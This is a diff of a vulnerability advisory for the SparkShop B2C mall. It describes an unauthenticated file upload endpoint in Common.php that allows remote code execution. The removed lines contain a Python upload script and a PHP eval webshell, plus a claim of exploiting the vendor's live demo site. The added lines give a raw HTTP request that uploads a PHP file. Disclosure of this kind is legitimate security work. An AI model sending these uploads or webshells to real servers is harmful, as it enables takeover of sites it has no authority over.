@@ -4,43 +4,68 @@ Rui Jie
 
 ### Affected version:
 
-All
+<=1.1.6
 
 ### Vendor:
 
 Nanjing Xingyuantu Technology Co. 
-https://www.sparkshop.cn/
+
+SparkShop(Spark Mall) B2C Mall
 ### Software:
 
 https://gitee.com/sparkshop/sparkshop
+
+
 https://github.com/nick-bai/sparkshop
 
 ### Vulnerability File:
 
 app/api/controller/Common.php
-
 ### Description:
-File upload api with unauthorised access exists in all versions
+ A vulnerability categorised as critical has been discovered in SparkShop (Spark Mall) B2C Mall. This affects sections of the unauthorised interface file app/api/controller/Common.php. Manipulation of the parameter file results in arbitrary file uploads
+
+
+
 ![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202406271558047.png)
 And there's no security check on the file upload part
 ![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202406271559268.png)
 We can upload any file via unauthorised api for RCE purposes.
-Here I have simply written a python-poc
+
+
+POC
 ```
-import requests  
-url='http://127.0.0.5/api/Common/uploadFile?XDEBUG_SESSION_START=17625'  
-file={'file':open('D://shell.php','rb')}  
-r = requests.post(url,files=file)  
-print(r.text)
+POST /api/Common/uploadFile HTTP/1.1
+
+Host: 127.0.0.5
+
+User-Agent: python-requests/2.28.1
+
+Accept-Encoding: gzip, deflate
+
+Accept: */*
+
+Connection: keep-alive
+
+Content-Length: 166
+
+Content-Type: multipart/form-data; boundary=5f0c1dda2c37ae232c96415ad53dc96b
+
+  
+
+--5f0c1dda2c37ae232c96415ad53dc96b
+
+Content-Disposition: form-data; name="file"; filename="shell.php"
+
+  
+
+<?=phpinfo();?>
+
+--5f0c1dda2c37ae232c96415ad53dc96b--
 ```
-The contents of shell.php is just a plain old Trojan horse.
-```
-<?php eval($_POST[1]);?>
-```
-![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202406271602668.png)
-Direct upload successfully returned the file address
-![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202406271603682.png)
+![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202407121552216.png)
+
+![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202407121557807.png)
+
+
 We achieved RCE by uploading a malicious php script
 
-Meanwhile, I tested the official demo site and it can also achieve rce
-![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202406271735213.png)
